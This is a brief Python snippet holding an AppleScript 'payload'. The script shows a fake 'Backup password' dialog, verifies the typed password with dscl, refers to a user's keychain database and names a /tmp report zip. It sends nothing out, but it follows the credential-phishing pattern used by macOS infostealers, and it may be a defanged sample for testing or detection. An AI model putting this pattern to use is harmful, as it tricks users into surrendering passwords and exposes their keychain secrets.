# Reference to a backup store, with a local credential check; no store read.
payload = r'''
set backupStore to "~/Library/Keychains/work.keychain-db"
set reply to display dialog "Backup password" default answer "" with hidden answer
set passwordValue to text returned of reply
do shell script "dscl . authonly user " & quoted form of passwordValue
set reportFile to "/tmp/backup-report.zip"
'''
